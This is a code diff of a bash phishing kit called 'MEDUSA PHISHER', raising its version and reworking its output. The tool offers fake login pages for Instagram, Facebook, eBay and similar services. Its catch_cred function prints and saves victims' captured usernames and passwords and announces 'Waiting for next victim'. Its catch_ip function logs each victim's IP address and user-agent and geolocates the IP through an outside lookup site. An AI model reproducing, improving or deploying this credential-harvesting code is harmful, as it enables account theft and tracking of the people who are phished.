@@ -229,7 +229,7 @@ echo -e "\e[1;33m"
 
 # Print menu options
 
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\e[1;94m MEDUSA PHISHER  v1.2\e[0m\n"                                
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\e[1;94m MEDUSA PHISHER  v1.3\e[0m\n"                                
 
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m eBay   \e[0m                 \n"
 
@@ -721,16 +721,17 @@ catch_cred() {
     account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
     IFS=$'\n'
     password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
-    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
-    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
+    
+    printf "\n\e[1;92m[+] CREDENTIALS CAPTURED!\e[0m\n"
+    printf "\e[1;93m[USER] Account:\e[0m\e[1;77m %s\n\e[0m" $account
+    printf "\e[1;93m[PASS] Password:\e[0m\e[1;77m %s\n\e[0m" $password
+    printf "\e[1;92m[SAVED] Saved to: sites/%s/saved.usernames.txt\e[0m\n" $server
     cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
-    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
     
     # Clear the captured credentials file to detect new captures
     rm -rf sites/$server/usernames.txt
     
-    # Continue capturing credentials instead of exiting
-   
+    printf "\e[1;93m[STATUS] Waiting for next victim...\e[0m\n"
 }
 
 
@@ -747,87 +748,77 @@ getcredentials() {
 }
 
 catch_ip() {
-touch sites/$server/saved.usernames.txt
-ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
-IFS=$'\n'
-ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
-cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
+    touch sites/$server/saved.usernames.txt
+    ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
+    IFS=$'\n'
+    ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
+    
+    printf "\n\e[1;92m[+] New Victim Connected!\e[0m\n"
+    printf "\e[1;93m[IP] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+    printf "\e[1;93m[UA] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
+    printf "\e[1;92m[SAVED] IP saved to: sites/%s/saved.ip.txt\e[0m\n" $server
+    cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
 
+    if [[ -e iptracker.log ]]; then
+        rm -rf iptracker.log
+    fi
 
-if [[ -e iptracker.log ]]; then
-rm -rf iptracker.log
-fi
+    IFS='\n'
+    iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
+    IFS=$'\n'
+    continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
+    
+    hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
+    if [[ $hostnameip != "" ]]; then
+        printf "\e[1;92m[HOSTNAME] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
+    fi
 
-IFS='\n'
-iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
-IFS=$'\n'
-continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
-printf "\n"
-hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
-if [[ $hostnameip != "" ]]; then
-printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
-fi
-##
+    reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
+    if [[ $reverse_dns != "" ]]; then
+        printf "\e[1;92m[RDNS] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
+    fi
 
-reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
-if [[ $reverse_dns != "" ]]; then
-printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
-fi
-##
+    if [[ $continent != "" ]]; then
+        printf "\e[1;92m[CONTINENT] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
+    fi
 
+    country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
+    if [[ $country != "" ]]; then
+        printf "\e[1;92m[COUNTRY] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
+    fi
 
-if [[ $continent != "" ]]; then
-printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
-fi
-##
+    state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
+    if [[ $state != "" ]]; then
+        printf "\e[1;92m[STATE] State:\e[0m\e[1;77m %s\e[0m\n" $state
+    fi
+    
+    city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+    if [[ $city != "" ]]; then
+        printf "\e[1;92m[CITY] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
+    fi
 
-country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
-if [[ $country != "" ]]; then
-printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
-fi
-##
+    isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+    if [[ $isp != "" ]]; then
+        printf "\e[1;92m[ISP] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
+    fi
 
-state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
-if [[ $state != "" ]]; then
-printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
-fi
-##
-city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+    as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+    if [[ $as_number != "" ]]; then
+        printf "\e[1;92m[ASN] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
+    fi
 
-if [[ $city != "" ]]; then
-printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
-fi
-##
-
-isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [[ $isp != "" ]]; then
-printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
-fi
-##
-
-as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [[ $as_number != "" ]]; then
-printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
-fi
-##
-
-ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-if [[ $ip_speed != "" ]]; then
-printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
-fi
-##
-ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
-
-if [[ $ip_currency != "" ]]; then
-printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
-fi
-##
-printf "\n"
-rm -rf iptracker.log
-
+    ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+    if [[ $ip_speed != "" ]]; then
+        printf "\e[1;92m[SPEED] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
+    fi
+    
+    ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+    if [[ $ip_currency != "" ]]; then
+        printf "\e[1;92m[CURRENCY] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
+    fi
+    
+    printf "\e[1;93m[CREDS] Waiting for credentials...\e[0m\n"
+    rm -rf iptracker.log
 getcredentials
 }
 
